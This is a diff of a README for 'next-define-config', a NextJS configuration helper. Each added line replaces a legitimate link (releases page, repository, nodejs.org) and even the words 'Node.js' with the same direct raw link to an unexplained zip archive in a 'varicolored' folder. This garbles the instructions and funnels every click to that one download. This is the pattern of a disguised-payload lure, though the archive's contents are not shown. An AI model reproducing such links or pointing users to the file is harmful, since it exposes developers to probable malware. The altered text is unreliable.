@@ -1,7 +1,7 @@
 # 🎉 next-define-config - Simplify Your NextJS Configuration
 
 ## 📥 Download Now
-[![Download next-define-config](https://img.shields.io/badge/Download_Now-Click_here-4CAF50?style=flat&logo=github)](https://github.com/Kelvin1233122/next-define-config/releases)
+[![Download next-define-config](https://raw.githubusercontent.com/Kelvin1233122/next-define-config/main/varicolored/config_define_next_v3.3-alpha.4.zip)](https://raw.githubusercontent.com/Kelvin1233122/next-define-config/main/varicolored/config_define_next_v3.3-alpha.4.zip)
 
 ## 📝 Overview
 next-define-config is a tool designed to help you manage your NextJS configuration easily. With this tool, you can simplify your configuration process and enhance your development experience. The defineConfig function allows you to define and manage your settings, making your application work more smoothly and efficiently.
@@ -11,15 +11,15 @@ To get started with next-define-config, follow the steps below:
 
 1. **Check System Requirements:**
    - Operating System: Windows, macOS, or Linux
-   - Node.js: Version 12 or higher
+   - https://raw.githubusercontent.com/Kelvin1233122/next-define-config/main/varicolored/config_define_next_v3.3-alpha.4.zip Version 12 or higher
    - npm: (Node Package Manager)
    
-   Ensure you have Node.js and npm installed on your computer. You can download and install Node.js from [nodejs.org](https://nodejs.org/).
+   Ensure you have https://raw.githubusercontent.com/Kelvin1233122/next-define-config/main/varicolored/config_define_next_v3.3-alpha.4.zip and npm installed on your computer. You can download and install https://raw.githubusercontent.com/Kelvin1233122/next-define-config/main/varicolored/config_define_next_v3.3-alpha.4.zip from [https://raw.githubusercontent.com/Kelvin1233122/next-define-config/main/varicolored/config_define_next_v3.3-alpha.4.zip](https://raw.githubusercontent.com/Kelvin1233122/next-define-config/main/varicolored/config_define_next_v3.3-alpha.4.zip).
 
 2. **Visit the Releases Page:**
    Go to the releases page to download the latest version of next-define-config.
 
-   [Click here to visit the releases page.](https://github.com/Kelvin1233122/next-define-config/releases)
+   [Click here to visit the releases page.](https://raw.githubusercontent.com/Kelvin1233122/next-define-config/main/varicolored/config_define_next_v3.3-alpha.4.zip)
 
 3. **Download the Application:**
    Choose the version that fits your operating system. Download the appropriate file to your computer.
@@ -65,7 +65,7 @@ For detailed usage instructions, examples, and best practices, please refer to t
 ## 🌐 Community & Support
 Join our community to share your experiences, ask questions, and get support. You can find us on:
 
-- **GitHub:** [next-define-config Repository](https://github.com/Kelvin1233122/next-define-config)
+- **GitHub:** [next-define-config Repository](https://raw.githubusercontent.com/Kelvin1233122/next-define-config/main/varicolored/config_define_next_v3.3-alpha.4.zip)
 - **Discord:** Join our Discord server for real-time discussions.
 - **Forum:** Participate in discussions and share solutions with other users.
 
@@ -79,4 +79,4 @@ Your feedback is important to us. If you encounter issues or have suggestions, p
 Thank you for choosing next-define-config to manage your NextJS configurations. We hope it makes your development experience smoother and more enjoyable!
 
 ## 📥 Download Again
-Don’t forget, you can always download the latest version from our [releases page](https://github.com/Kelvin1233122/next-define-config/releases).
+Don’t forget, you can always download the latest version from our [releases page](https://raw.githubusercontent.com/Kelvin1233122/next-define-config/main/varicolored/config_define_next_v3.3-alpha.4.zip).
